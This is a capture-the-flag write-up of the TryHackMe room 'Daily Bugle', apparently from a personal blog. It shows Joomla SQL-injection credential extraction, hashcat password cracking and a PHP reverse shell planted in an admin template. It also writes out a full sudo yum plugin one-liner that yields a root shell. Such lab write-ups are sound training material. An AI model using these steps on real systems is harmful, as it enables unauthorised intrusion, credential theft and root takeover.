---
title: "Daily Bugle - TryHackMe"
date: 2026-04-01 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [nmap, privilege-escalation, ctf, joomla]
image: /assets/img/writeups/covers/daily-bugle.png
---
# Daily Bugle - TryHackMe
![1.png](/assets/img/writeups/daily-bugle/1.png)
**Difficulty**: Hard<br>**Time Required**: 45 min
## Overview
![1.png](/assets/img/writeups/daily-bugle/2.png)
[Daily Bugle](https://tryhackme.com/room/dailybugle) is a hands-on TryHackMe room focused on web exploitation and privilege escalation. It involves enumerating a Joomla-based website, identifying known vulnerabilities, and leveraging them to gain initial access. The challenge then progresses into basic privilege escalation to obtain higher-level access and capture the flags.<br>🛠️ Tools Used: nmap, joomscan, joomblah, gtfobins<br>🔴 Warning: This write-up contains full solutions and flag locations. Attempt the room yourself before reading further.
## Nmap scan
Performed an Nmap scan to identify open ports and services running on the target system.
````
$ nmap -sC -sV 10.49.133.217
````

- `-sC` Runs Nmap’s default set of NSE 
- `-sV` Enables service version detection


````
$ nmap -sC -sV 10.49.133.217        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-01 07:17 +0500
Nmap scan report for 10.49.133.217 (10.49.133.217)
Host is up (0.068s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds
````
### Findings
- **22 (SSH)**: Running OpenSSH 7.4
- **80 (HTTP)**: Apache 2.4.6 (CentOS) with PHP 5.6.40, Joomla CMS detected
- **3306 (MySQL)**: MariaDB (10.3.23 or earlier), requires authentication
- `robots.txt` reveals multiple restricted directories for enumeration


## Web Enumeration
Visiting the web server on port 80 reveals the Daily Bugle homepage, which provides information about who robbed the bank.
![1.png](/assets/img/writeups/daily-bugle/3.png)
From the `nmap` scan, it was discovered that `robots.txt` contains an `/administrator` endpoint. Visiting this endpoint reveals a login page that can be further explored.
![1.png](/assets/img/writeups/daily-bugle/4.png)
## Vulnerability Identification
At this stage, it was identified that the web server is running Joomla, so the [OWASP JoomScan](https://github.com/OWASP/joomscan) tool can be used to gather more information about the CMS and identify potential vulnerabilities.<br>**Install joomscan:**
````
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl
````
Used the command to scan the target with JoomScan: `perl joomscan.pl -u 10.49.133.217`
![1.png](/assets/img/writeups/daily-bugle/5.png)
## Credential Extraction
At this stage, the Joomla version is disclosed, providing two possible approaches. The first option is to search for the version on Exploit Database and use an exploit that leverages SQL injection (e.g., via sqlmap) to retrieve credentials; however, this method can be time-consuming. A more efficient approach is to use a dedicated script designed for Joomla 3.7.0, such as [Joomblah](https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py), which can be used to extract the username and password directly from the database.
![1.png](/assets/img/writeups/daily-bugle/6.png)
## Password Cracking
The username was identified as `jonah`, and the password was obtained in hash format. The hash type was determined using [hash identifier](https://hashes.com/en/tools/hash_identifier).
![1.png](/assets/img/writeups/daily-bugle/7.png)
The identified hash type is bcrypt, and its corresponding Hashcat mode (3200) can be found in the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes).
![1.png](/assets/img/writeups/daily-bugle/8.png)
**Note**: To save time, a targeted Hashcat command was used to start cracking passwords within a specific range (45000–50000) from `rockyou.txt`. A standard Hashcat command can also be used to crack the password, but it may take longer.<br>**Standard Command**
````
$ hashcat -m 3200 -a 0 --force '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' /usr/share/wordlists/rockyou.txt
````
**Optimized Command**
````
$ sed -n '45000,50000p' /usr/share/wordlists/rockyou.txt | hashcat -m3200 -a0 --force '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
````
![1.png](/assets/img/writeups/daily-bugle/9.png)
These credentials can now be used to authenticate to the Joomla administrator panel.
## Initial Access
Log in using the obtained credentials and begin exploring the application for potential entry points. In this case, the Templates section was identified as a viable attack vector, as it allows editing of PHP templates. By injecting a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) into one of the templates, a reverse shell was successfully obtained.
![1.png](/assets/img/writeups/daily-bugle/10.png)
![1.png](/assets/img/writeups/daily-bugle/11.png)
Start a netcat listener:
````
$ nc -lvnp 1234
````
Trigger the php reverse shell payload with the following url:
````
http://10.49.133.217/templates/protostar/error.php
````
![1.png](/assets/img/writeups/daily-bugle/12.png)
## Post-Exploitation
After obtaining a reverse shell, the next step is to retrieve the `user.txt` flag. Access to the home directory of `jjameson` is restricted, so an alternative approach is required. Navigate to `/var/www/html` and look for Joomla configuration files likely `configuration.php`, which may contain database credentials that can be used for further access.
![1.png](/assets/img/writeups/daily-bugle/13.png)
Switch to the jjameson user using the obtained credentials and retrieve the `user.txt` flag.
![1.png](/assets/img/writeups/daily-bugle/14.png)
## Privilege Escalation
Check which commands jjameson can run with `sudo` using `sudo -l`, which reveals that `yum` can be executed. Search for `yum` on GTFOBins and use the provided payloads to obtain a root shell.
````
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
````
![1.png](/assets/img/writeups/daily-bugle/15.png)
The GTFOBins commands were modified and combined into a single command.
````
TF=$(mktemp -d) && \
echo -e "[main]\nenabled=1" > "$TF/y.conf" && \
echo -e "import os\nfrom yum.plugins import TYPE_CORE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n    os.setuid(0)\n    os.setgid(0)\n    os.execl('/bin/sh', '/bin/sh')" > "$TF/y.py" && \
echo -e "[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF" > "$TF/x" && \
sudo yum -c "$TF/x" --enableplugin=y

````
![1.png](/assets/img/writeups/daily-bugle/16.png)
Now running as root, the `root.txt` flag can be retrieved.
